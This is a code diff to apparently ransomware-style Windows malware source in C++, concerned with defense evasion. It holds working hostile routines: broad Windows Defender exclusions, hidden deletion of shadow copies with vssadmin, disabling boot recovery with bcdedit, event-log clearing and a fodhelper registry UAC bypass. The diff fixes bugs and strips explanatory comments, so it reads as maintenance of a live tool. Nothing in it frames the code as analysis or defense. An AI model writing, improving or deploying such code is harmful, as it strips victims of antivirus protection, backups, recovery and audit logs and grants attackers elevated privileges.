@@ -1,10 +1,10 @@
 #include "evasion.h"
 #include <windows.h>
+#include <shellapi.h>
 
 static const wchar_t* EXCLUSION_PATHS[] = {
     L"C:\\", L"D:\\", L"E:\\",
     L"%AppData%", L"%Temp%", L"%SystemRoot%",
-    // ... (253 total in real sample)
     nullptr
 };
 
@@ -23,9 +23,9 @@ void add_defender_exclusions() {
 
 void wipe_shadow_copies() {
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.fMask   = SEE_MASK_NOCLOSEPROCESS;
-    sei.lpVerb  = L"open";
-    sei.nShow   = SW_HIDE;
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"open";
+    sei.nShow  = SW_HIDE;
 
     sei.lpFile       = L"vssadmin.exe";
     sei.lpParameters = L"delete shadows /all /quiet";
@@ -43,10 +43,13 @@ void wipe_shadow_copies() {
         CloseHandle(sei.hProcess);
     }
 
-    // disable recovery
     sei.lpFile       = L"bcdedit.exe";
-    sei.lpParameters = L"bcdedit /set {default} recoveryenabled No";
+    sei.lpParameters = L"/set {default} recoveryenabled No";
     ShellExecuteExW(&sei);
+    if (sei.hProcess) {
+        WaitForSingleObject(sei.hProcess, 5000);
+        CloseHandle(sei.hProcess);
+    }
 }
 
 void clear_event_logs() {
@@ -61,7 +64,6 @@ void clear_event_logs() {
 }
 
 void uac_bypass() {
-    // fodhelper bypass — classic, no prompt
     HKEY hKey;
     RegCreateKeyExW(HKEY_CURRENT_USER,
         L"Software\\Classes\\ms-settings\\shell\\open\\command",
@@ -72,9 +74,7 @@ void uac_bypass() {
 
     RegSetValueExW(hKey, L"", 0, REG_SZ,
         (BYTE*)self_path,
-        (wcslen(self_path) + 1) * sizeof(wchar_t));
-
-    DWORD val = 1;
+        (DWORD)((wcslen(self_path) + 1) * sizeof(wchar_t)));
     RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
         (BYTE*)L"", sizeof(wchar_t));
     RegCloseKey(hKey);
